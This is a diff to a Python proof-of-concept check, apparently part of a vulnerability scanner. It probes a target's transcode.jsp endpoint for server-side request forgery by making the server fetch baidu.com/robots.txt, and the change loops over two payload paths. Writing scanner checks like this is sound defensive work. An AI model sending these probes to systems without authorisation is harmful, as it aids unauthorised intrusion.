@@ -32,10 +32,11 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
             payloads = ['/web/transcode.jsp?pg=webz&url=','/transcode.jsp?pg=webz&url=']
-            vul_url = arg + payload + 'http://baidu.com/robots.txt'
-            response = requests.get(vul_url)
-            if response.status_code ==200 and 'Baiduspider' in response.content:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
+            for payload in payloads:
+                vul_url = arg + payload + 'http://baidu.com/robots.txt'
+                response = requests.get(vul_url)
+                if response.status_code ==200 and 'Baiduspider' in response.content:
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;payload={payload}'.format(target=self.target, name=self.vuln.name, payload=payload))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
